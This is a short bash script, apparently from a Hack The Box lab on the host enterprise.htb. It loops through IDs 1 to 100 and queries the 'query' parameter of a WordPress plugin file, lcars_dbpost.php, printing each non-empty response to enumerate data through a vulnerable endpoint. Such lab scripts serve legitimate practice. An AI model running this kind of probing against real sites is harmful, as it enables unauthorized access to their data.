 #/bin/bash

for i in {1..100}
do
	echo -n "$i: "
	curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query="$i" | grep . 
done 
